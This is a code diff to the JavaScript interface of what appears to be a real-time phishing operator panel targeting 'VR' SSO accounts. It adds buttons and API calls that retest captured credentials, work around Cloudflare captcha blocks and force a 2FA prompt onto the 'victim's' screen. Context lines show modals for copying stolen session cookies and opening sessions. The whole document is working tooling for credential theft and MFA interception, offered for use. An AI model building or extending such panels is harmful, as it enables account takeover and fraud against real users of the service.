@@ -26,6 +26,12 @@ const modalCookiesJson = document.getElementById("modal-cookies-json");
 const btnFecharModalCookies = document.getElementById("btn-fechar-modal-cookies");
 const btnCopiarModalCookies = document.getElementById("btn-copiar-modal-cookies");
 const btnModalAbrirSessao = document.getElementById("btn-modal-abrir-sessao");
+const modalForcar2FA = document.getElementById("modal-forcar-2fa");
+const btnFecharModalForcar = document.getElementById("btn-fechar-modal-forcar");
+const btnModalRetestar = document.getElementById("btn-modal-retestar");
+const btnModalConfirmarForcar = document.getElementById("btn-modal-confirmar-forcar");
+let usuarioAlvoForcar = "";
+
 const toast = document.getElementById("toast");
 const toastMsg = document.getElementById("toast-msg");
 
@@ -34,6 +40,32 @@ function showToast(msg) {
   toastMsg.textContent = msg;
   toast.classList.add("show");
   setTimeout(() => toast.classList.remove("show"), 2500);
+}
+
+function abrirModalForcar2FA(usuario) {
+  usuarioAlvoForcar = usuario;
+  if (modalForcar2FA) modalForcar2FA.style.display = "flex";
+}
+
+function fecharModalForcar2FA() {
+  usuarioAlvoForcar = "";
+  if (modalForcar2FA) modalForcar2FA.style.display = "none";
+}
+
+if (btnFecharModalForcar) btnFecharModalForcar.addEventListener("click", fecharModalForcar2FA);
+if (btnModalRetestar) {
+  btnModalRetestar.addEventListener("click", () => {
+    const u = usuarioAlvoForcar;
+    fecharModalForcar2FA();
+    if (u) retestarSSO(u);
+  });
+}
+if (btnModalConfirmarForcar) {
+  btnModalConfirmarForcar.addEventListener("click", () => {
+    const u = usuarioAlvoForcar;
+    fecharModalForcar2FA();
+    if (u) solicitar2FA(u, true);
+  });
 }
 
 function atualizarBotaoAuto() {
@@ -109,7 +141,7 @@ function copiarTexto(texto, rotulo = "Valor") {
   });
 }
 
-async function solicitar2FA(usuario) {
+async function solicitar2FA(usuario, forcar = false) {
   if (!usuario) return;
   try {
     const res = await fetch("/api/solicitar-2fa", {
@@ -117,15 +149,41 @@ async function solicitar2FA(usuario) {
       headers: {
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({ usuario })
+      body: JSON.stringify({ usuario, forcar })
     });
     const json = await res.json();
     if (json.success) {
       showToast(`2FA solicitado para ${usuario}! Tela da vítima liberada.`);
       carregarDados();
+    } else {
+      showToast(json.mensagem || "Aviso no status da credencial.");
+      if (json.bloqueio_captcha && !forcar) {
+        abrirModalForcar2FA(usuario);
+      }
     }
   } catch (err) {
     console.error("Erro ao solicitar 2FA:", err);
+  }
+}
+
+async function retestarSSO(usuario) {
+  if (!usuario) return;
+  try {
+    showToast(`🔄 Re-tentando SSO da VR para ${usuario}...`);
+    const res = await fetch("/api/retestar-sso", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ usuario })
+    });
+    const json = await res.json();
+    if (json.success) {
+      showToast(`Re-teste iniciado! Aguarde validação na VR.`);
+      carregarDados();
+    } else {
+      showToast(json.mensagem || "Erro ao re-testar SSO.");
+    }
+  } catch (err) {
+    console.error("Erro ao re-testar SSO:", err);
   }
 }
 
@@ -300,13 +358,16 @@ function renderizarTabela() {
                   </button>
                 ` : (
                   item.status_credencial === "bloqueio_captcha" ? `
-                    <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b;" title="A VR apresentou desafio Cloudflare Turnstile. Você pode solicitar o 2FA se desejar." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
-                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                      <span>Solicitar 2FA (Captcha)</span>
+                    <button class="btn-warning-sm" type="button" style="background: rgba(245, 158, 11, 0.2); border: 1px solid #f59e0b; color: #f59e0b; display: inline-flex; align-items: center; gap: 5px;" title="A VR apresentou desafio Cloudflare Turnstile. Clique para resolver e re-tentar no SSO." onclick="retestarSSO('${escapeQuotes(item.usuario)}')">
+                      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.2"/></svg>
+                      <span>Resolver Captcha</span>
+                    </button>
+                    <button class="btn-secondary" type="button" style="padding: 5px 8px; font-size: 11px; border-color: rgba(245, 158, 11, 0.4); color: #f59e0b;" title="Atenção: A VR não gerou código MFA real." onclick="abrirModalForcar2FA('${escapeQuotes(item.usuario)}')">
+                      <span>Forçar 2FA</span>
                     </button>
                   ` : (
                     item.status_credencial === "invalido" ? `
-                      <button class="btn-danger-sm" type="button" title="A VR indicou que a senha está incorreta. Você pode forçar se desejar." onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
+                      <button class="btn-danger-sm" type="button" title="A VR indicou que a senha está incorreta." onclick="abrirModalForcar2FA('${escapeQuotes(item.usuario)}')">
                         <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                         <span>Forçar 2FA (Inválido)</span>
                       </button>
